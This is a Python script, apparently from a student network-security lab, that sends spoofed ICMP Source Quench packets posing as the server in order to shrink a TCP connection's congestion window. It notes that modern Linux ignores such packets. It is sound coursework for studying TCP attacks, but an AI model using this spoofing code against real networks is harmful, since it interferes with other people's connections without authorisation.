"""
source_quench.py  —  ATTACK 2b: Congestion-Window shrink (Phase 5, secondary).
Owner: DEBASHRI

Spoof ICMP Source Quench (Type 4, Code 0), source-spoofed as the Server, to
fake congestion so TCP Reno cuts cwnd (report §2.5, §3.3).

IMPORTANT (report §1): Linux has IGNORED Source Quench since 2004. So the
EXPECTED result on a modern kernel is "no effect" — record that as a finding,
it is not a bug in our code. Verify empirically first (Phase 5, step 10).
"""

import time
from scapy.all import send
from common import config, packet_utils
from attack1_reset import infer_tuple


def run(interval=1.0, rounds=30):
    print("[*] Attack 2b (Source Quench) — may be a no-op on modern Linux.")
    for r in range(rounds):
        for port in infer_tuple.candidate_ports():
            send(packet_utils.build_source_quench(client_port=port), verbose=0)
        time.sleep(interval)
    print("[+] Done. Check `ss -ti` cwnd/ssthresh — did anything change?")
    # TODO(Debashri): before trusting a null result, confirm the kernel setting
    # and note the exact kernel version in the report (§3.3 caveat).


if __name__ == "__main__":
    run()
